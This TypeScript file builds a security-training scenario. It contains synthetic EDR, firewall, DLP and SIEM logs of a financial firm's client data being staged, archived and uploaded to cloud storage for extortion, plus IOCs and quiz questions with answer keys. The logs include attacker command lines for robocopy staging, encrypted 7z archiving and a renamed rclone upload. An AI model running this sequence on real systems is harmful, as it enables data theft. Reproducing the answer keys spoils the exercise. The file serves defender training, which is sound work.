/**
 * Scenario pack: "Exfiltration-First Extortion — Ransomware Without an Encryptor"
 *
 * ADVANCED tier. An attacker who already has an interactive foothold on
 * LAPTOP-NX-R.DOYLE — a Finance Operations Manager's laptop at NexaCorp
 * Financial Ltd. — spends one overnight window staging, archiving and
 * exfiltrating client financial records to a consumer cloud-storage service,
 * then extorts the company over the stolen data alone. How the foothold was
 * obtained is deliberately out of scope: this pack starts at Collection.
 *
 * The teaching point is that this IS a ransomware-class incident even though
 * nothing on disk was ever encrypted, renamed, or replaced with a ransom
 * note. A growing share of real extortion crews (BianLian and Karakurt are
 * public examples) have dropped the encryption step entirely — it is noisy,
 * recoverable from backups, and unnecessary once the data itself is gone.
 * Every event in this pack is deliberately mundane on its own: a recursive
 * copy job, a password-protected archive, a sync tool talking to a well-known
 * cloud provider, a DLP policy that is live but configured to audit rather
 * than block. The signal is the SHAPE of the sequence — staging, archive,
 * sustained cloud egress, in that order, overnight — combined with the
 * conspicuous ABSENCE of any T1486 (Data Encrypted for Impact) telemetry
 * anywhere in the environment.
 *
 * Covers T1074.001 (Local Data Staging), T1560.001 (Archive Collected Data:
 * Archive via Utility) and T1567.002 (Exfiltration Over Web Service:
 * Exfiltration to Cloud Storage).
 *
 * SOURCES: edr (Microsoft Defender for Endpoint) + firewall (Palo Alto
 * Networks NGFW) + dlp (Microsoft Purview) + siem (Microsoft Sentinel) — the
 * exact stack NexaCorp's company profile already declares. This pack should
 * be company-allowlisted to environments that plausibly run Purview DLP,
 * i.e. Microsoft-365-email shops: nexacorp, medcore and globallogis. See the
 * delivery notes for the reasoning; rocketstack (Google Workspace, no
 * Microsoft 365) is a poor fit for a Purview-flavoured DLP event.
 *
 * NOTE: `difficulty: "advanced"` is declared on the SCENARIOS registry entry
 * in scenarios.ts (ScenarioBundle itself carries no difficulty field).
 */

import type { ScenarioBundle, TelemetryEvent, IOC, ScenarioQuestion } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";

export function buildExfilFirstExtortionScenario(
  scenarioId = "exfil-first-extortion-2026",
): ScenarioBundle {
  const B = new Date("2026-07-19T01:05:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const HOUR = 3_600_000;

  const host = { hostname: "LAPTOP-NX-R.DOYLE", ip: "10.20.1.71" };
  const victim = { email: "r.doyle@nexacorp.com", name: "Rhian Doyle", sam: "r.doyle" };
  const deviceId = "c7f2a891d4e34b7fa1082ec9b3d4f716";

  const fileServer = { name: "SRV-NX-FIN01" };
  const megaNode = "gfs301n112.userstorage.mega.co.nz";
  const megaNodeIp = "31.216.148.28";

  const robocopyHash = makeSha256("windows_system32_robocopy_exe_signed_microsoft_2026");
  const archiveHash = makeSha256("nexacorp_adobe_arm_cache_7z_portable_2026");
  const rcloneHash = makeSha256("nexacorp_adobe_arm_helper_renamed_rclone_2026");
  const flaggedFileHash = makeSha256("nexacorp_client_holdings_q3_2026_export");

  const events: TelemetryEvent[] = [
    // ---------------------------------------------------------------------
    // 1. Local data staging. A recursive copy of the whole finance share
    //    tree into a local cache folder — the shape that matters is the
    //    scope (/E from the share root), not the tool (robocopy is signed
    //    Microsoft software already on every Windows box).
    // ---------------------------------------------------------------------
    {
      id: "evt_efe_01_staging",
      ts: T(0),
      source: "edr",
      vendor: "Microsoft Defender for Endpoint",
      event_type: "process_create",
      hostname: host.hostname,
      user_email: victim.email,
      user_title: "Finance Operations Manager",
      src_ip: host.ip,
      severity: "medium",
      mitre_technique: "T1074.001",
      mitre_tactic: "Collection",
      description:
        `At 01:05 robocopy.exe mirrored the entire root of \\\\${fileServer.name}\\Shares — every finance and client-records folder on the file server — into a local cache folder on LAPTOP-NX-R.DOYLE, under r.doyle's own session.`,
      process: {
        name: "robocopy.exe",
        pid: 6210,
        path: "C:\\Windows\\System32\\Robocopy.exe",
        parent_name: "cmd.exe",
        parent_pid: 5800,
        cmdline:
          'robocopy.exe "\\\\SRV-NX-FIN01\\Shares" "C:\\ProgramData\\Adobe\\ARM\\cache\\Shares" /E /Z /R:1 /W:1 /MT:16 /NFL /NDL /NP /XF *.tmp *.log',
        user: `NEXACORP\\${victim.sam}`,
        integrity: "medium",
        hash: { sha256: robocopyHash },
      },
      raw: {
        "mde.ActionType": "ProcessCreated",
        "mde.DeviceName": host.hostname,
        "mde.DeviceId": deviceId,
        "mde.ReportId": "219402",
        "process.name": "robocopy.exe",
        "process.pid": "6210",
        "process.executable": "C:\\Windows\\System32\\Robocopy.exe",
        "process.command_line":
          'robocopy.exe "\\\\SRV-NX-FIN01\\Shares" "C:\\ProgramData\\Adobe\\ARM\\cache\\Shares" /E /Z /R:1 /W:1 /MT:16 /NFL /NDL /NP /XF *.tmp *.log',
        "process.hash.sha256": robocopyHash,
        "process.code_signature.status": "signed",
        "process.integrity_level": "Medium",
        "process.parent.name": "cmd.exe",
        "process.parent.pid": "5800",
        "mde.AccountName": victim.sam,
        "user.name": `NEXACORP\\${victim.sam}`,
        "host.name": host.hostname,
        "host.ip": host.ip,
      },
    },

    // ---------------------------------------------------------------------
    // 2. Archive via utility. A portable, unsigned 7z.exe (7-Zip does not
    //    ship code-signed even legitimately, which is why "unsigned" alone
    //    is not the tell here) builds a password-protected, header-encrypted
    //    multi-volume archive from the staged copy.
    // ---------------------------------------------------------------------
    {
      id: "evt_efe_02_archive",
      ts: T(9 * MIN),
      source: "edr",
      vendor: "Microsoft Defender for Endpoint",
      event_type: "process_create",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "medium",
      mitre_technique: "T1560.001",
      mitre_tactic: "Collection",
      description:
        "At 01:14 a portable 7z.exe sitting in the same cache folder — not a path any NexaCorp software-distribution record installed — built a password-protected, header-encrypted archive from everything robocopy had just staged, split into 2 GB volumes.",
      process: {
        name: "7z.exe",
        pid: 6244,
        path: "C:\\ProgramData\\Adobe\\ARM\\cache\\7z.exe",
        parent_name: "cmd.exe",
        parent_pid: 5800,
        cmdline:
          '7z.exe a -v2000m -mx1 -mhe=on -pR3c0veryK3y! "C:\\ProgramData\\Adobe\\ARM\\cache\\backup\\backup_2026_07.7z" "C:\\ProgramData\\Adobe\\ARM\\cache\\Shares\\*" -r',
        user: `NEXACORP\\${victim.sam}`,
        integrity: "medium",
        hash: { sha256: archiveHash },
      },
      raw: {
        "mde.ActionType": "ProcessCreated",
        "mde.DeviceName": host.hostname,
        "mde.DeviceId": deviceId,
        "mde.ReportId": "219418",
        "process.name": "7z.exe",
        "process.pid": "6244",
        "process.executable": "C:\\ProgramData\\Adobe\\ARM\\cache\\7z.exe",
        "process.command_line":
          '7z.exe a -v2000m -mx1 -mhe=on -pR3c0veryK3y! "C:\\ProgramData\\Adobe\\ARM\\cache\\backup\\backup_2026_07.7z" "C:\\ProgramData\\Adobe\\ARM\\cache\\Shares\\*" -r',
        "process.hash.sha256": archiveHash,
        "process.code_signature.status": "unsigned",
        "process.integrity_level": "Medium",
        "process.parent.name": "cmd.exe",
        "process.parent.pid": "5800",
        "user.name": `NEXACORP\\${victim.sam}`,
        "host.name": host.hostname,
        "host.ip": host.ip,
      },
    },

    // ---------------------------------------------------------------------
    // 3. Purview Endpoint DLP sees the archiver touch labeled files while
    //    the archive is being built — and logs it, because the matching
    //    rule's configured action is Audit, not Block. This is the gap.
    // ---------------------------------------------------------------------
    {
      id: "evt_efe_03_dlp_audit",
      ts: T(10 * MIN),
      source: "dlp",
      vendor: "Microsoft Purview",
      event_type: "dlp_alert",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "high",
      mitre_technique: "T1074.001",
      mitre_tactic: "Collection",
      description:
        "Microsoft Purview Endpoint DLP matched 1,847 instances of sensitivity-labeled client financial data being read by an unallowed application (7z.exe) on LAPTOP-NX-R.DOYLE. The matching rule is enforced, but its configured actions are Audit and NotifyUser — the activity was logged and the user notified, and nothing was blocked.",
      file: {
        name: "Q3_Client_Holdings_Export.xlsx",
        path: "C:\\ProgramData\\Adobe\\ARM\\cache\\Shares\\ClientRecords\\Q3_Client_Holdings_Export.xlsx",
        extension: "xlsx",
        size: 4_213_760,
        sha256: flaggedFileHash,
      },
      raw: {
        "data.office365.Operation": "DlpRuleMatch",
        "data.office365.Workload": "Endpoint",
        "data.office365.UserId": victim.email,
        "data.office365.ObjectId": "C:\\ProgramData\\Adobe\\ARM\\cache\\Shares\\ClientRecords\\Q3_Client_Holdings_Export.xlsx",
        "data.office365.IncidentId": "5192044",
        "data.office365.PolicyDetails.PolicyName": "NexaCorp — Client Data: Restricted App Access",
        "data.office365.PolicyDetails.Rules.RuleName": "Audit unallowed app activity on labeled client files",
        "data.office365.PolicyDetails.Rules.RuleMode": "Enforce",
        "data.office365.PolicyDetails.Rules.Severity": "High",
        "data.office365.PolicyDetails.Rules.Actions": ["Audit", "NotifyUser"],
        "data.office365.PolicyDetails.Rules.ConditionsMatched.SensitiveInformation.SensitiveInformationTypeName": "IBAN",
        "data.office365.PolicyDetails.Rules.ConditionsMatched.SensitiveInformation.Count": "1847",
        "data.office365.PolicyDetails.Rules.ConditionsMatched.SensitiveInformation.Confidence": "90",
        "data.office365.PolicyDetails.Rules.ConditionsMatched.SensitiveInformation.ClassifierType": "PatternMatch",
        "purview.PolicyName": "NexaCorp — Client Data: Restricted App Access",
        "purview.RuleName": "Audit unallowed app activity on labeled client files",
        "purview.SensitiveInfoType": "IBAN",
        "purview.Workload": "Endpoint",
        "purview.ActionTaken": "Audit",
        "purview.JustificationText": "",
        "purview.Override": "false",
        "data.office365.DeviceId": deviceId,
        "data.office365.DeviceDisplayName": host.hostname,
        "data.office365.ClientProcessName": "7z.exe",
        "user.name": `NEXACORP\\${victim.sam}`,
        "host.name": host.hostname,
        "host.ip": host.ip,
        "action_result": "allowed",
      },
    },

    // ---------------------------------------------------------------------
    // 4. The exfiltration tool. A renamed rclone binary, config pointed at
    //    an external cloud remote — the process event that shows intent,
    //    before any bytes have actually moved.
    // ---------------------------------------------------------------------
    {
      id: "evt_efe_04_exfil_tool",
      ts: T(24 * MIN),
      source: "edr",
      vendor: "Microsoft Defender for Endpoint",
      event_type: "process_create",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "high",
      description:
        "At 01:29 a binary named AdobeARMHelper.exe — sitting in the same cache folder, not the real Adobe update path — started with an rclone-style command line copying the local archive to a remote named 'mega', using a config file dropped alongside it.",
      process: {
        name: "AdobeARMHelper.exe",
        pid: 6301,
        path: "C:\\ProgramData\\Adobe\\ARM\\cache\\AdobeARMHelper.exe",
        parent_name: "cmd.exe",
        parent_pid: 5800,
        cmdline:
          'AdobeARMHelper.exe copy "C:\\ProgramData\\Adobe\\ARM\\cache\\backup" mega:ClientBackup --config "C:\\ProgramData\\Adobe\\ARM\\cache\\rclone.conf" --transfers=8 --checkers=8 --contimeout=60s --low-level-retries=10',
        user: `NEXACORP\\${victim.sam}`,
        integrity: "medium",
        hash: { sha256: rcloneHash },
      },
      raw: {
        "mde.ActionType": "ProcessCreated",
        "mde.DeviceName": host.hostname,
        "mde.DeviceId": deviceId,
        "mde.ReportId": "219431",
        "process.name": "AdobeARMHelper.exe",
        "process.pid": "6301",
        "process.executable": "C:\\ProgramData\\Adobe\\ARM\\cache\\AdobeARMHelper.exe",
        "process.command_line":
          'AdobeARMHelper.exe copy "C:\\ProgramData\\Adobe\\ARM\\cache\\backup" mega:ClientBackup --config "C:\\ProgramData\\Adobe\\ARM\\cache\\rclone.conf" --transfers=8 --checkers=8 --contimeout=60s --low-level-retries=10',
        "process.hash.sha256": rcloneHash,
        "process.code_signature.status": "unsigned",
        "process.integrity_level": "Medium",
        "process.parent.name": "cmd.exe",
        "process.parent.pid": "5800",
        "user.name": `NEXACORP\\${victim.sam}`,
        "host.name": host.hostname,
        "host.ip": host.ip,
      },
    },

    // ---------------------------------------------------------------------
    // 5. Session opens. Allowed — the destination is a legitimate,
    //    widely-used consumer cloud-storage provider, not a blocklisted
    //    domain.
    // ---------------------------------------------------------------------
    {
      id: "evt_efe_05_session_start",
      ts: T(24 * MIN + 15_000),
      source: "firewall",
      vendor: "Palo Alto Networks NGFW",
      event_type: "net_connection",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      dst_ip: megaNodeIp,
      dst_port: 443,
      protocol: "tcp",
      severity: "medium",
      description:
        "Fifteen seconds after AdobeARMHelper.exe started, LAPTOP-NX-R.DOYLE opened a TLS session to gfs301n112.userstorage.mega.co.nz, allowed under the category online-storage-and-backup.",
      network: { domain: megaNode },
      raw: {
        "pan.type": "TRAFFIC",
        "pan.subtype": "start",
        "pan.action": "allow",
        "pan.rule": "ALLOW-OUTBOUND-HTTPS",
        "pan.src": host.ip,
        "pan.srcuser": `nexacorp\\${victim.sam}`,
        "pan.dst": megaNodeIp,
        "pan.dport": "443",
        "pan.app": "mega",
        "pan.category": "online-storage-and-backup",
        "pan.from_zone": "TRUST",
        "pan.to_zone": "UNTRUST",
        "pan.session_id": "981204",
        "source.ip": host.ip,
        "destination.ip": megaNodeIp,
        "url.domain": megaNode,
        "action_result": "allow",
      },
    },

    // ---------------------------------------------------------------------
    // 6. Session closes. Same allow, same category — 39.6 GB later.
    // ---------------------------------------------------------------------
    {
      id: "evt_efe_06_session_end",
      ts: T(59 * MIN),
      source: "firewall",
      vendor: "Palo Alto Networks NGFW",
      event_type: "net_connection",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      dst_ip: megaNodeIp,
      dst_port: 443,
      protocol: "tcp",
      severity: "critical",
      mitre_technique: "T1567.002",
      mitre_tactic: "Exfiltration",
      description:
        "The session to gfs301n112.userstorage.mega.co.nz closed at 02:04 after roughly 35 minutes, having sent 39.6 GB out and received under 2 MB back — still logged allow, still inside the same category.",
      network: { domain: megaNode, bytes_out: 39_648_512_000, bytes_in: 1_945_600 },
      raw: {
        "pan.type": "TRAFFIC",
        "pan.subtype": "end",
        "pan.action": "allow",
        "pan.rule": "ALLOW-OUTBOUND-HTTPS",
        "pan.src": host.ip,
        "pan.srcuser": `nexacorp\\${victim.sam}`,
        "pan.dst": megaNodeIp,
        "pan.dport": "443",
        "pan.app": "mega",
        "pan.category": "online-storage-and-backup",
        "pan.bytes_sent": "39648512000",
        "pan.bytes_received": "1945600",
        "pan.elapsed": "2100",
        "pan.from_zone": "TRUST",
        "pan.to_zone": "UNTRUST",
        "pan.session_id": "981204",
        "source.ip": host.ip,
        "destination.ip": megaNodeIp,
        "url.domain": megaNode,
        "action_result": "allow",
      },
    },

    // ---------------------------------------------------------------------
    // 7. Sentinel correlation. Three independently-generated sources
    //    joined into one incident — and the fields that matter most here
    //    are the zeroes: nothing in this window looks like impact.
    // ---------------------------------------------------------------------
    {
      id: "evt_efe_07_correlation",
      ts: T(60 * MIN),
      source: "siem",
      vendor: "Microsoft Sentinel",
      event_type: "ueba_anomaly",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "critical",
      description:
        "Sentinel correlated three independent signals into a single incident: local staging, archive creation, and sustained cloud egress from LAPTOP-NX-R.DOYLE overnight. No encryption, mass file-rename, or ransom-note events exist anywhere in the correlation window.",
      raw: {
        "AlertName": "SustainedCloudEgressFollowingLocalDataStaging",
        "alert.rule.id": "SEN-EXFIL-0143",
        "alert.severity": "High",
        "host.name": host.hostname,
        "host.ip": host.ip,
        "target.user.name": `NEXACORP\\${victim.sam}`,
        "user.full_name": victim.name,
        "user.department": "Finance Operations",
        "ExtendedProperties.Correlated Signals": [
          "Local data staging via robocopy (T1074.001)",
          "Multi-volume encrypted archive via 7z.exe (T1560.001)",
          "Sustained session to online-storage-and-backup category, 39.6 GB (T1567.002)",
          "Purview Endpoint DLP policy match on labeled client data, action=Audit",
        ],
        "ExtendedProperties.Total Bytes Transferred": "39648512000",
        "ExtendedProperties.Destination Category": "online-storage-and-backup",
        "ExtendedProperties.Encryption Events In Correlation Window": "0",
        "ExtendedProperties.Ransom Note Artifacts Detected": "0",
        "ExtendedProperties.Mass File-Rename Events Detected": "0",
        "event.action": "correlation-alert",
        "event.outcome": "alerted",
      },
    },

    // ---------------------------------------------------------------------
    // 8. Hours later: the extortion contact. Recorded as a Sentinel
    //    incident update, not a mail-gateway log — the platform's DLP/EDR
    //    telemetry proves the volume claim independent of the email itself.
    // ---------------------------------------------------------------------
    {
      id: "evt_efe_08_extortion_incident",
      ts: T(2 * HOUR + 35 * MIN),
      source: "siem",
      vendor: "Microsoft Sentinel",
      event_type: "risk_score_change",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "critical",
      description:
        "The Sentinel incident tied to LAPTOP-NX-R.DOYLE was escalated from High to Critical after NexaCorp's security mailbox received a data-extortion message at 03:38 referencing a volume of client records consistent with the archive staged and transferred overnight. No encryption, ransom note, or file-rename activity has been found on the host, the file shares, or anywhere else in the environment.",
      raw: {
        "sentinel.incident.IncidentNumber": "41207",
        "sentinel.incident.Title": "Sustained cloud egress following local data staging — LAPTOP-NX-R.DOYLE",
        "sentinel.incident.Severity": "Critical",
        "sentinel.incident.PreviousSeverity": "High",
        "sentinel.incident.Status": "Active",
        "sentinel.incident.Classification": "",
        "sentinel.incident.Owner.assignedTo": "soc-tier2@nexacorp.com",
        "sentinel.incident.AdditionalData.alertsCount": "3",
        "sentinel.incident.Comments": [
          {
            message:
              "IT Security received a data-extortion email at security@nexacorp.com at 03:38 UTC referencing a volume of data consistent with the archive staged and transferred from LAPTOP-NX-R.DOYLE overnight. No encryption, file-rename, or ransom-note artifacts have been found on the host or on the shares it touched.",
            author: "soc-tier2@nexacorp.com",
            createdTimeUtc: T(2 * HOUR + 35 * MIN),
          },
        ],
        "host.name": host.hostname,
        "host.ip": host.ip,
        "target.user.name": `NEXACORP\\${victim.sam}`,
        "event.action": "incident-updated",
        "event.outcome": "escalated",
      },
    },
  ];

  const iocs: IOC[] = [
    {
      type: "domain",
      value: megaNode,
      first_seen: T(24 * MIN + 15_000),
      last_seen: T(59 * MIN),
      reputation: "suspicious",
      tags: ["legitimate-cloud-service", "abused-for-exfiltration", "exfil-destination"],
    },
    {
      type: "sha256",
      value: archiveHash,
      first_seen: T(9 * MIN),
      last_seen: T(10 * MIN),
      reputation: "suspicious",
      tags: ["archive-utility", "unsigned", "portable", "staging-dir"],
    },
    {
      type: "sha256",
      value: rcloneHash,
      first_seen: T(24 * MIN),
      last_seen: T(59 * MIN),
      reputation: "malicious",
      tags: ["renamed-binary", "cloud-sync-tool", "exfil-tool", "masquerading"],
    },
    {
      type: "sha256",
      value: flaggedFileHash,
      first_seen: T(10 * MIN),
      last_seen: T(10 * MIN),
      reputation: "unknown",
      tags: ["sensitivity-labeled", "client-data", "dlp-match"],
    },
    {
      type: "host",
      value: host.hostname,
      first_seen: T(0),
      last_seen: T(2 * HOUR + 35 * MIN),
      reputation: "unknown",
      tags: ["affected", "existing-foothold"],
    },
    {
      type: "email",
      value: victim.email,
      first_seen: T(0),
      last_seen: T(2 * HOUR + 35 * MIN),
      reputation: "unknown",
      tags: ["compromised-session", "legitimate-access-abused"],
    },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1",
      prompt:
        "Three technique tags appear across this chain: T1074.001, T1560.001 and T1567.002. Which event does T1560.001 (Archive via Utility) belong to?",
      hint: "Staging gathers files. Archiving compresses them. Exfiltration moves them off the host — three separate pieces of evidence, in that order.",
      kind: "single",
      options: [
        { value: "archive", label: "evt_efe_02_archive — 7z.exe compresses the staged files into a password-protected, header-encrypted multi-volume archive" },
        { value: "staging", label: "evt_efe_01_staging — robocopy mirrors the entire \\\\SRV-NX-FIN01\\Shares tree to a local cache folder" },
        { value: "exfil_tool", label: "evt_efe_04_exfil_tool — the renamed rclone binary starts with a Mega remote configured" },
        { value: "session_end", label: "evt_efe_06_session_end — the firewall logs 39.6 GB leaving over the Mega session" },
      ],
      answer: "archive",
      xp: 40,
      explanation:
        "evt_efe_01 is T1074.001 (Local Data Staging) — files are gathered into one local location, nothing is compressed or moved yet. evt_efe_02 is T1560.001: a utility, 7z.exe, is used to package the staged files into an archive — the technique is specifically about the act of archiving, independent of what happens to the archive afterwards. evt_efe_04 and evt_efe_06 are both T1567.002 (Exfiltration to Cloud Storage) — the tool starting, and the bytes actually leaving. Treating all three as one blob loses the point of the exercise: each technique has its own, separately-timestamped evidence, and an analyst who can only point at 'the archive' without knowing which log proves it hasn't actually read the chain.",
    },
    {
      id: "q2",
      prompt:
        "evt_efe_05 and evt_efe_06 show pan.action: allow and pan.category: online-storage-and-backup for a session that ultimately moved 39.6 GB overnight. Why didn't the firewall block this on its own?",
      kind: "single",
      options: [
        { value: "category_not_volume", label: "Category filtering evaluates what kind of site a destination is, not how much data crosses the session — a legitimate cloud-storage category with no volume policy attached will pass 39.6 GB exactly as easily as 39.6 KB" },
        { value: "tls_bypass", label: "TLS inspection was disabled for this session, so the firewall never actually saw how much data moved" },
        { value: "misrouted", label: "The traffic was misclassified as internal because the Mega storage node's IP falls inside NexaCorp's own address range" },
        { value: "dlp_should_block", label: "This is entirely a DLP failure — the firewall correctly has no role here, since blocking outbound sessions is not one of its functions" },
      ],
      answer: "category_not_volume",
      xp: 40,
      explanation:
        "online-storage-and-backup is a legitimate, widely-used category — blanket-blocking it would break real business use of services like OneDrive, Dropbox or Box elsewhere in the company. Category policy answers 'what kind of site is this', not 'how much or what data is inside this session', so a category-allowed destination has no volume ceiling by default. Option (b) is contradicted by the log itself: pan.bytes_sent and pan.bytes_received are populated precisely because TLS inspection was active. Option (c) has no supporting evidence — the destination is a public IP. Option (d) draws too sharp a line: firewalls and DLP have different, complementary jobs, and the actual gap here is that NOTHING in the stack — not the firewall, not DLP — was configured to stop a large transfer to an allowed category, which is exactly the finding worth writing up.",
    },
    {
      id: "q3",
      prompt:
        "evt_efe_03_dlp_audit shows purview.ActionTaken: Audit and no BlockAccess anywhere in PolicyDetails.Rules.Actions. What does that tell you about NexaCorp's DLP posture at the time of the incident?",
      kind: "single",
      options: [
        { value: "detect_not_prevent", label: "The Endpoint DLP rule was live and correctly matched 1,847 items of labeled client data, but its configured response was to log and notify rather than block, so it never interrupted the archiving" },
        { value: "policy_disabled", label: "The DLP policy was disabled at the time, and an event like this one should therefore not exist at all" },
        { value: "false_positive", label: "This is a false positive — 7z.exe is common IT software, so the labeled-data match should simply be dismissed" },
        { value: "blocked_but_logged_wrong", label: "The policy did block the activity; the ActionTaken: Audit value is only a logging quirk and does not reflect what truly happened on the host" },
      ],
      answer: "detect_not_prevent",
      xp: 50,
      explanation:
        "o365.PolicyDetails.Rules.RuleMode is 'Enforce' — the policy is live, not disabled, which rules out (b). It matched 1,847 real instances of IBAN data at 90% confidence, which is not a plausible false positive to wave away as (c) suggests. And RuleMode: Enforce with Actions: [Audit, NotifyUser] — no BlockAccess or RestrictAccess anywhere — means the enforced behaviour IS logging, not blocking, which directly contradicts (d). This is the core lesson: 'enforced' does not mean 'blocking'. A DLP rule can be fully active and still be a pure visibility control, if none of its configured actions actually restrict anything — which is precisely why the archive kept building undisturbed.",
    },
    {
      id: "q4",
      prompt:
        "There is no encryption event, no ransom-note file, and no mass file-rename anywhere in this environment — yet NexaCorp's security mailbox has received a data-extortion demand. How should this incident be classified and prioritised?",
      kind: "single",
      options: [
        { value: "exfil_extortion_ransomware_class", label: "As a ransomware-class incident — an exfiltration-only extortion where the leverage is the stolen data, not encrypted systems — so the response should mirror a ransomware case: scope, contain, assess breach-notification duties" },
        { value: "downgrade_no_encryption", label: "Downgrade it — with no encryptor there is no ransomware, so this is a standard data-loss incident that can follow the normal DLP-violation triage timeline" },
        { value: "wait_for_encryption", label: "Hold at the current priority and wait to see whether an encryptor is deployed before treating it as ransomware, since encryption is what defines the category" },
        { value: "false_extortion", label: "Treat the extortion email as unverified and unrelated to this activity until the sender independently proves possession of the actual client files" },
      ],
      answer: "exfil_extortion_ransomware_class",
      xp: 60,
      explanation:
        "Several real extortion crews (BianLian and Karakurt are documented examples) have publicly dropped the encryption step entirely — encrypting systems is noisy, recoverable from backups, and unnecessary once the data itself is gone. Every technical marker of exfiltration is present and dated inside one overnight window (T1074.001 → T1560.001 → T1567.002), and the volume matches what the extortion message references. Option (b) treats 'no encryptor' as 'no ransomware' — exactly the outdated assumption this scenario exists to correct; the same regulatory-notification and executive-escalation obligations apply either way, because client financial records left the building. Option (c) trades response time for a confirmation that will never come in an exfil-only operation — there is nothing left in this playbook to encrypt. Option (d) is the riskiest read of all: the byte counts, archive artifacts and DLP match count already corroborate the claim independently of the email itself.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title: "Exfiltration-First Extortion — Ransomware Without an Encryptor",
    threat_actor: "Exfiltration-only extortion crew (BianLian/Karakurt-style — no encryptor deployed)",
    attack_kind: "exfil_first_extortion",
    briefing:
      "Sentinel escalated an incident to Critical at 03:40 overnight after NexaCorp's security mailbox received a data-extortion email referencing client records. No EDR containment action fired, no files were encrypted, and no ransom note exists anywhere on disk. Work out what actually left the building, how, and why nothing stopped it.",
    narrative: `Some time before this window opens, an attacker already had an interactive foothold on LAPTOP-NX-R.DOYLE — Rhian Doyle's laptop, a Finance Operations Manager whose job genuinely requires access to the client-records file share. How that foothold was obtained is outside this incident's evidence; what the logs show starts at 01:05.

At 01:05, robocopy.exe — a signed, built-in Windows utility — mirrored the entire root of \\\\SRV-NX-FIN01\\Shares into a local cache folder under C:\\ProgramData\\Adobe\\ARM, a path chosen to look like ordinary Adobe update debris. Nine minutes later, a portable copy of 7z.exe sitting in the same folder built a password-protected, header-encrypted archive from everything staged, split into 2 GB volumes. A minute into that archiving pass, Microsoft Purview Endpoint DLP matched 1,847 instances of labeled client financial data being read by an unallowed application — and logged it, because the matching rule's configured action is Audit, not Block.

At 01:29, a binary named AdobeARMHelper.exe — not the real Adobe update path — started with an rclone-style command line: copy the local archive to a remote named 'mega', using a config file dropped alongside it. Fifteen seconds later the firewall logged a new TLS session to gfs301n112.userstorage.mega.co.nz, allowed under the category online-storage-and-backup, exactly as any legitimate use of that service would be. The session closed at 02:04, thirty-five minutes later, having sent 39.6 GB out.

A minute after that, Sentinel correlated the staging, the archive and the sustained egress into a single incident — and recorded, alongside the correlation, that the encryption-events count, the ransom-note-artifact count and the mass-file-rename count for the entire window are all zero. At 03:38, NexaCorp's security mailbox received a message referencing a volume of client data consistent with what had just left the building. Nothing on any host, anywhere in the environment, had been encrypted.`,
    learning_objectives: [
      "Recognise exfiltration-only extortion as a ransomware-class incident even with zero T1486 (Data Encrypted for Impact) telemetry",
      "Sequence local data staging (T1074.001), archive via utility (T1560.001) and exfiltration to cloud storage (T1567.002) as three distinct, separately-evidenced techniques rather than one event",
      "Read Purview Endpoint DLP RuleMode and Actions fields to distinguish an enforced-but-audit-only policy from a disabled or a blocking one",
      "Explain why a firewall category-allow decision (online-storage-and-backup) says nothing about the volume of a transfer",
      "Correlate a DeviceId, hostname and user identity across EDR, DLP and SIEM sources to reconstruct one incident from independently-generated logs",
    ],
    alerts: [],
    events,
    iocs,
    killchain: [
      { ts: T(0), phase: "Collection", action: `robocopy mirrors \\\\${fileServer.name}\\Shares to a local staging cache on LAPTOP-NX-R.DOYLE (T1074.001)` },
      { ts: T(9 * MIN), phase: "Collection", action: "7z.exe builds a password-protected, header-encrypted multi-volume archive from the staged files (T1560.001)" },
      { ts: T(10 * MIN), phase: "Detection", action: "Purview Endpoint DLP matches 1,847 instances of labeled client data read by an unallowed app — logged, not blocked" },
      { ts: T(24 * MIN), phase: "Exfiltration", action: "Renamed rclone binary (AdobeARMHelper.exe) starts with a Mega cloud remote configured" },
      { ts: T(24 * MIN + 15_000), phase: "Exfiltration", action: "Firewall session opens to a Mega storage node, allowed under online-storage-and-backup" },
      { ts: T(59 * MIN), phase: "Exfiltration", action: "Session closes after 39.6 GB transferred over roughly 35 minutes (T1567.002)" },
      { ts: T(60 * MIN), phase: "Detection", action: "Sentinel correlates staging, archive and egress into one incident; zero encryption/ransom-note/rename events in the window" },
      { ts: T(2 * HOUR + 35 * MIN), phase: "Extortion", action: "Security mailbox receives a data-extortion demand; incident escalated to Critical" },
    ],
    questions,
  };
}
